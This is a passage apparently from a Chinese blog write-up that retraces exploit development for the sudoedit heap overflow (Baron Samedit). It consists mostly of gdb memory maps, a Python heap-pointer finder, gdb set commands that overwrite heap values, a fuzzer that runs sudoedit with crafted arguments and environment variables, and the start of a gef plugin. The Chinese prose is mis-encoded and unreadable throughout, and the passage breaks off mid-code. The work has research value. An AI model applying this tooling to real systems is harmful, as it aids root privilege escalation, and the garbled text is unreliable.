/usr/lib/locale/C.UTF-8/LC_CTYPE0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack] ç¼–å†™pythonè„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384vmmap=&#x27;&#x27;&#x27;0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]&#x27;&#x27;&#x27;import structmemmap = []for mem in vmmap.splitlines(): if &#x27;r-x&#x27; in mem: start, end, size, perm, f = mem.split(&#x27; &#x27;) start = int(start, 16) end = int(end, 16) memmap.append((start, end))with open(&#x27;/pwd/heap&#x27;,&#x27;rb&#x27;) as f: heap = f.read()n = 0x41for i in range(0, len(heap), 8): heap_addr = i+0x005555555f9000 b = heap[i:i+8] q = struct.unpack(&#x27;Q&#x27;, b)[0] for mem in memmap: if q&gt;=mem[0] and q&lt;=mem[1]: # print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;) print(f&quot;set *0x&#123;heap_addr:016x&#125; = 0x&quot;+(hex(n)[2:]*5)) n += 1 if 0x000055555561b4d0 == heap_addr: print(f&quot;0x&#123;heap_addr:016x&#125;: our [buffer]&quot;) å¾—åˆ°ç»“æœ èƒ½å †æº¢å‡ºçš„å †åœ¨æœ€ä¸‹é¢ï¼Œä¸èƒ½è¦†å†™ä»»ä½•å‡½æ•°æŒ‡é’ˆï¼Œè‰¹ é‡æ–°åˆ†æï¼Œåˆ¤æ–­æ‰¾åˆ°çš„å‡½æ•°æ˜¯å¦çœŸçš„è¢«æ‰§è¡Œäº†ï¼Œä½œè€…è¿™é‡Œä¿®æ”¹äº†ä»–çš„è„šæœ¬ 12345678910111213n = 0x41for i in range(0, len(heap), 8): heap_addr = i+0x005555555f9000 b = heap[i:i+8] q = struct.unpack(&#x27;Q&#x27;, b)[0] for mem in memmap: if q&gt;=mem[0] and q&lt;=mem[1]: # print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;) print(f&quot;set *0x&#123;heap_addr:016x&#125; = 0x&quot;+(hex(n)[2:]*5)) n += 1 if 0x000055555561b4d0 == heap_addr: print(f&quot;0x&#123;heap_addr:016x&#125;: our [buffer]&quot;) ç”Ÿæˆä¸ä¼šé€ æˆcrashçš„æ–‡ä»¶ 1echo -en &quot;0edit\\x00-s\\x000000000&quot; &gt; /tmp/normal åœ¨gdbä¸­è®¾ç½®è¿™äº›å€¼ 12345678910111213set *0x00005555556149a8 = 0x4141414141set *0x00005555556149b0 = 0x4242424242set *0x0000555555615260 = 0x4343434343set *0x0000555555615268 = 0x4444444444set *0x0000555555617e00 = 0x4545454545set *0x0000555555617eb0 = 0x4646464646set *0x0000555555618378 = 0x4747474747set *0x0000555555618398 = 0x4848484848set *0x00005555556183b8 = 0x4949494949set *0x00005555556183d8 = 0x4a4a4a4a4aset *0x00005555556184d8 = 0x4b4b4b4b4bset *0x0000555555619b40 = 0x4c4c4c4c4cset *0x000055555561a0b0 = 0x4d4d4d4d4d å–æ¶ˆæ–­ç‚¹ç»§ç»­ï¼Œåº”è¯¥å°±ä¼šå‡ºç°ä¸€äº›æŠ¥é”™äº† &gt;&gt;é—®é¢˜ æ²¡æœ‰å‡ºç°æŠ¥é”™ï¼Œå¹¶ä¸”ç›´æ¥æ‰§è¡Œäº† è„šæœ¬çš„ç›¸å…³çš„åœ°å€å†™é”™äº† å‘ç°ä¸€ä¸ªçº¢é»‘æ ‘! ç»“æœçœ‹åˆ°comparå˜é‡è¢«æˆ‘ä»¬è¦†ç›–äº†ï¼Œè¯´æ˜å‡½æ•°çœŸçš„è¢«è°ƒç”¨äº†ï¼Œå¦‚æœæˆ‘ä»¬èƒ½è¦†ç›–comparåœ°å€ï¼Œé‚£ä¹ˆå°±èƒ½æ”¹å†™å‡½æ•°æŒ‡é’ˆã€‚é‡å¤è¿™äº›è¿‡ç¨‹å°±å¯ä»¥æ‰¾åˆ°æ›´å¤šçš„å‡½æ•°æŒ‡é’ˆã€‚æ¯”å¦‚ä¿®æ”¹è¾“å…¥ç±»å‹ï¼Œç„¶åæŠŠè¾“å…¥æ¢æˆæ™®é€šè¾“å…¥ï¼Œset *0x000055555561a0b0 = 0x4d4d4d4d4dæ¢æ‰ï¼Œå¾—åˆ°å¦ä¸€ä¸ªcrash å¼ºåˆ¶å †åˆ†é… åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œèƒ½æº¢å‡ºçš„bufferä½äºæœ€åº•å±‚ï¼Œä¸èƒ½æ›´æ”¹èƒ½è¢«ä½¿ç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œæ‰€ä»¥å°è¯•æš´åŠ›å–æº¢å‡ºé•¿åº¦ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ†é…åˆ°ä¸Šé¢ä¸€ç‚¹çš„ä½ç½®ã€‚ æ ¸å¿ƒæ€æƒ³æ˜¯éšæœºè¾“å…¥åˆ°sudoeditï¼Œç„¶åè°ƒç”¨ä¸ŠèŠ‚æ‰¾åˆ°çš„å‡½æ•°æ—¶ï¼Œæ‰“å°è¯¥å‡½æ•°æŒ‡é’ˆå’Œæ‰“å°å †æº¢å‡ºçš„chunk æ”¹å†™sudoæºç  çœŸå®ç¯å¢ƒä¸‹çš„sudoå’Œæµ‹è¯•ä¸‹çš„sudoæ˜¯ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸ºäº†è´´è¿‘æ­£å¼çš„ç¯å¢ƒï¼Œè¦å°½é‡çš„è´´è¿‘çœŸå®æƒ…å†µä¸‹çš„sudo æ·»åŠ æ‰“å°å‚æ•°Chunkåœ°å€ å·²ä¸Šä¸€èŠ‚çš„çº¢é»‘æ ‘ä¸ºä¾‹ï¼Œæ‰“å°comparçš„å€¼ å¿˜å†™åˆ†å·äº† 12./configure &amp;&amp; makeln -s /pwd/sudo_test/src/.libs/sudo ./src/.libs/sudoedit ä½œè€…åœ¨è¿™é‡Œè¸©äº†å‘ï¼Œæˆ‘æƒ³å¤ç°ä¸‹ï¼Œä¸æƒ³çœ‹çš„å¯ä»¥ç•¥è¿‡ è™½ç„¶æŠ¥é”™çš„æ–¹å¼ä¸ä¸€æ ·ï¼Œä½†æ˜¯ç»“æœå’ŒåŸå› éƒ½æ˜¯ä¸€æ ·çš„ã€‚ä¸€ä¸ªéƒ½æ˜¯libsudoè¿™ä¸ªåº“æ‰¾ä¸åˆ°ï¼Œä½œè€…çš„é—®é¢˜æ˜¯ä½¿ç”¨çš„æ˜¯ç³»ç»Ÿå˜é‡ä¸­çš„åº“ï¼Œä½†æ˜¯è¿™ä¸ªåº“ä¸å«æœ‰printfå³å…¶ä»–è¾“å‡ºï¼Œè‡ªç„¶ä¹Ÿå°±æ²¡æ³•æ‰“å°å­—ç¬¦ä¸² &gt;&gt;é—®é¢˜ æ²¡æœ‰ååº” æ‰¾æ‰¾æ˜¯ä¸æ˜¯ä»£ç å†™çš„æ–‡ä»¶æ˜¯å…¶ä»–æ–‡ä»¶çš„ä»£ç  æ‰€ä»¥ä½¿ç”¨make installå®‰è£…æ–¹æ³•å°±å¥½äº†ï¼Œåªè¦ä¹‹å‰makeè¿‡ä¸€æ¬¡ä¹‹åå°±éƒ½å¯ä»¥äº† å †æº¢å‡ºå‘ç”Ÿæ—¶ï¼Œç¨‹åºå¹¶ä¸ä¼šç«‹å³crashï¼Œè€Œæ˜¯ä¼šè¿›å…¥åˆ°çº¢é»‘æ ‘çš„éƒ¨åˆ†ï¼Œä½†æ˜¯èƒ½æº¢å‡ºçš„user_argsåœ°å€åœ¨rbtree1åœ°å€åé¢ï¼Œæ‰€ä»¥ä¾ç„¶æ— æ³•åˆ©ç”¨ æš´åŠ›æµ‹è¯•è„šæœ¬ å°è¯•æ„é€ ä¸åŒçš„è¾“å…¥ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æœ‰è·¯å¾„å¯ä»¥æŠŠå‡½æ•°æŒ‡é’ˆæ”¾åœ¨æˆ‘ä»¬èƒ½æº¢å‡ºçš„chunkåé¢çš„ è¾“å…¥æ¥æº stdin æ–‡ä»¶(files) åè®®å‚æ•°(arguments) ç¯å¢ƒå˜é‡(env vars) è®¾ç½®é•¿åº¦ 123456# define some common size values usable for different inputs_SIZES = [i for i in range(0,0xff)]_SIZES += [2**i for i in range(0,15)]_SIZES += [(2**i)+1 for i in range(0,15)]_SIZES += [(2**i)-1 for i in range(0,15)]_SIZES += ([0]*50) sudoå‚æ•°åè®®(sudo help) 1234567# define some flags from sudo -hARG1 = [&quot;-A&quot;,&quot;-B&quot;,&quot;-E&quot;,&quot;-e&quot;,&quot;-H&quot;,&quot;-K&quot;,&quot;-k&quot;,&quot;-l&quot;,&quot;-n&quot;,&quot;-P&quot;,&quot;-S&quot;,&quot;-s&quot;]ARG1 += [None, None, None, None, None, None, None]ARG2 = _SIZESARG3 = _SIZESHOSTNAME = _SIZESENV = _SIZES è®¾ç½®æµ‹è¯•é›† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# dump a testcase into a logfiledef dump_file(fname, lines, ptrs, arg, env, key): # create the folders if they don&#x27;t exist directory = os.path.dirname(fname) if not os.path.exists(directory): os.makedirs(directory) # don&#x27;t write the dump file if it&#x27;s already too large if os.path.isfile(fname) and Path(fname).stat().st_size &gt; 200000: return # write to file with open(fname, &#x27;a+&#x27;) as f: f.write(&quot;----------------------------\\n&quot;) f.write(lines[1].decode(&#x27;ascii&#x27;)) if key: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] f.write(f&quot;user_args &lt; &#123;key.decode(&#x27;ascii&#x27;)&#125;\\n&quot;) f.write(f&quot;distance: 0x&#123;distance:x&#125;\\n&quot;) if key: f.write(f&quot;0x&#123;ptrs[b&#x27;user_args&#x27;]:016x&#125; &lt; 0x&#123;ptrs[key]:016x&#125;\\n&quot;) f.write(&quot;args: sudoedit &quot;) f.write(&quot; &quot;.join(arg)) f.write(&quot;\\n\\n&quot;) for k in env: f.write(f&quot;&#123;k&#125;=&#123;env[k]&#125;\\n&quot;) f.write(&quot;\\n&quot;) f.write(lines[0].decode(&#x27;ascii&#x27;)) f.write(&quot;\\n&quot;) test = &#123;&#125; test[&#x27;arg&#x27;] = arg test[&#x27;env&#x27;] = env f.write(json.dumps(test)) f.write(&quot;\\n\\n&quot;)# this will run sudoedit with a set of arguments and environment variablesdef run_sudoedit(arg, env): print(&quot;-------------&quot;) # disable stdout buffering with stdbuf wrapping around sudoedit # and add the commandline arguments _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg # execute it p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) try: # send some newlines and check if we get any output lines = p.communicate(b&quot;x\\nx\\nx\\nx\\n&quot;, timeout=0.1) except subprocess.TimeoutExpired: # terminate on timeout p.terminate() lines = p.communicate() if p.returncode == -11: print(f&quot;SEGFAULT&quot;) # read the list of function pointers ptrs = &#123;&#125; skipping = True for line in lines[0].splitlines(): key,val = line.split(b&#x27;=&#x27;) if key == b&#x27;user_args&#x27;: skipping = False if not skipping: ptrs[key] = int(val,16) # go through all function pointers if ptrs and b&#x27;user_args&#x27; in ptrs: for key in ptrs: if key != b&#x27;user_args&#x27;: # is our overflow buffer before a function pointer? if ptrs[b&#x27;user_args&#x27;] &lt; ptrs[key]: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] if distance&lt;14000: fname = f&#x27;&#123;FOLDER&#125;/&#123;distance&#125;&#x27; dump_file(fname, lines, ptrs, arg, env, key) # did we get a segfault? if p.returncode == -11: fname = f&quot;&#123;FOLDER&#125;/crashes/segfault_&#123;distance&#125;&quot; dump_file(fname, lines, ptrs, arg, env, None) return returnALPHABET = &#x27;0123456789ABCDEFGHIKLMNOPQRSTUVWXYZ&#x27; fuzzä¸»è¦åŠŸèƒ½ 12345678910111213141516171819202122232425262728# fuzz loopwhile True: # select random size values arg1 = random.choice(ARG1) rand_arg2_size = random.choice(ARG2) rand_arg3_size = random.choice(ARG3) rand_hostname_size = random.choice(HOSTNAME) rand_env_size = random.choice(ENV) arg = [] env = &#123;&#125; # arguments # ... -s AAAAAAA\\ ... if arg1: arg.append(arg1) arg.append(&quot;-s&quot;) arg.append(random.choice(ALPHABET)*rand_arg2_size + &quot;\\\\&quot;) if rand_arg3_size: arg.append(random.choice(ALPHABET)*rand_arg3_size) # environment variables if rand_hostname_size: env[&quot;HOSTNAME&quot;] = random.choice(ALPHABET)*rand_hostname_size if rand_env_size: env[random.choice(ALPHABET)*3] = random.choice(ALPHABET)*rand_env_size # run sudoedit run_sudoedit(arg, env) å¼€å§‹fuzz 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# this will run sudoedit with a set of arguments and environment variablesdef run_sudoedit(arg, env): print(&quot;-------------&quot;) # disable stdout buffering with stdbuf wrapping around sudoedit # and add the commandline arguments _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg # execute it p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) try: # send some newlines and check if we get any output lines = p.communicate(b&quot;x\\nx\\nx\\nx\\n&quot;, timeout=0.1) except subprocess.TimeoutExpired: # terminate on timeout p.terminate() lines = p.communicate() if p.returncode == -11: print(f&quot;SEGFAULT&quot;) # read the list of function pointers ptrs = &#123;&#125; skipping = True for line in lines[0].splitlines(): key,val = line.split(b&#x27;=&#x27;) if key == b&#x27;user_args&#x27;: skipping = False if not skipping: ptrs[key] = int(val,16) # go through all function pointers if ptrs and b&#x27;user_args&#x27; in ptrs: for key in ptrs: if key != b&#x27;user_args&#x27;: # is our overflow buffer before a function pointer? if ptrs[b&#x27;user_args&#x27;] &lt; ptrs[key]: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] if distance&lt;14000: fname = f&#x27;&#123;FOLDER&#125;/&#123;distance&#125;&#x27; dump_file(fname, lines, ptrs, arg, env, key) # did we get a segfault? if p.returncode == -11: fname = f&quot;&#123;FOLDER&#125;/crashes/segfault_&#123;distance&#125;&quot; dump_file(fname, lines, ptrs, arg, env, None) return return æœ€åå‘ç°chunkä½ç½®ç›¸å·®å¤ªè¿œä¸åŒ ï¼Œæ ¹æœ¬æ— æ³•åˆ©ç”¨ GDBå·¥å…·ç¼–å†™ é˜¶æ®µ 1 è¦æ”¹è¿›ä¸Šé¢çš„æš´åŠ›è„šæœ¬ï¼Œå°±è¦çŸ¥é“æˆ‘å¯¹çš„åˆ†é…æƒ…å†µï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨gdbé‡Œé¢åœ¨æ¯æ¬¡mallocä¸‹æ–­ç‚¹æŸ¥çœ‹sizeå‚æ•°ã€‚ æ›´ä¸ºä¾¿æ·çš„æŠ€å·§æ˜¯æŸ¥çœ‹freeæ—¶å€™çš„æŒ‡é’ˆçš„åœ°å€çš„å€¼ï¼Œå¦‚æœæ˜¯æˆ‘ä»¬è®¤è¯†çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½æ§åˆ¶åˆ°å“ªé‡Œ 123456789set breakpoint pending onbreak freecommands silent printf &quot;free(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; è¿è¡Œ 1gdb -x ./gdb.init /usr/local/bin/sudoedit &gt; free_trace å‘ç°æœ‰ç¯å¢ƒå˜é‡ï¼Œå†æ¬¡å°è¯•è®¾ç½®ç¯å¢ƒå˜é‡ å‘ç°æ ¹æœ¬æ²¡å˜ï¼Œè¦æ˜¯æˆ‘ä»¬å°è¯•æ›´å¤šçš„ç¯å¢ƒå˜é‡å‘¢ï¼Ÿ é˜¶æ®µ 2 ç›´æ¥åœ¨åŠ è½½ç¯å¢ƒå˜é‡ï¼ˆgetenv(3p)ï¼‰çš„æ—¶å€™ä¸‹æ–­ç‚¹ï¼Œçœ‹çœ‹ç”¨äº†é‚£äº› 12345678910set breakpoint pending onbreak getenvcommands silent printf &quot;getenv(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; å‘ç°å¯ä»¥è®¾ç½®çš„ç¯å¢ƒå˜é‡å€¼ å†æ¬¡æ”¹å†™è„šæœ¬ 12345678910111213141516171819202122232425262728set breakpoint pending onset environment LOCPATH = HEAP0set environment LC_ALL = HEAP1set environment LC_IDENTIFICATION = HEAP2set environment LANG = HEAP3set environment LC_MEASUREMENT = HEAP4set environment LC_TELEPHONE = HEAP5set environment LC_ADDRESS = HEAP6set environment LC_NAME = HEAP7set environment LC_PAPER = HEAP8set environment LC_MESSAGES = HEAP9set environment LC_MONETARY = HEAPAset environment LC_COLLATE = HEAPBset environment LC_TIME = HEAPCset environment LC_NUMERIC = HEAPDset environment LC_CTYPE = HEAPEset environment GCONV_PATH = HEAPFset environment TZ = HEAPGset environment SHELL = HEAPIbreak freecommands silent printf &quot;free(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; æ‰€ä»¥å¯ä»¥ä»è¿™äº›åœ°æ–¹ä¸‹æ‰‹æ¥æ„å»ºæ›´å¥½çš„æš´åŠ›æµ‹è¯•å·¥å…·ï¼ŒåŒæ—¶ä½œè€…ä¹Ÿåœ¨ç¬¬ä¸€ä»½æš´åŠ›æµ‹è¯•å·¥å…·ä¸­çŠ¯äº†å¾ˆå¤šé”™è¯¯ã€‚ç”¨githubä¸Šçš„æ”¹è¿›ç‰ˆæœ¬èƒ½å¿«é€Ÿæ‰¾åˆ°èƒ½åˆ©ç”¨çš„ç‚¹ æˆ–è®¸åˆ©ç”¨ç‚¹åœ¨äºè¦†å†™ç¯å¢ƒå˜é‡ï¼Ÿ é˜¶æ®µ 3 è¿™æ—¶é‡Œexpè¿˜å¾ˆè¿œï¼Œä¹Ÿå¯ä»¥å°è¯•ä¸‹åˆ†æå †æº¢å‡ºè¿‡åè¿˜æœ‰å“ªäº›åœ°æ–¹ç”³è¯· ä½œè€…ç›´æ¥å†™äº†ä¸€ä¸ªgefçš„æ‹“å±•å·¥å…· 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149# gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit__AUTHOR__ = &quot;liveoverflow&quot;__VERSION__ = 0.1import collectionsimport gdbimport json# persist &quot;database&quot; to the filedef dump(j): with open(&#x27;/tmp/malloc.json&#x27;, &#x27;w&#x27;) as f: f.write(json.dumps(j))# load &quot;database&quot; from the filedef load(): with open(&#x27;/tmp/malloc.json&#x27;, &#x27;r&#x27;) as f: j = json.loads(f.read()) return j# handler for malloc() breakpointsclass MallocBreakpoint(gdb.Breakpoint): def __init__(self, location, *args, **kwargs): 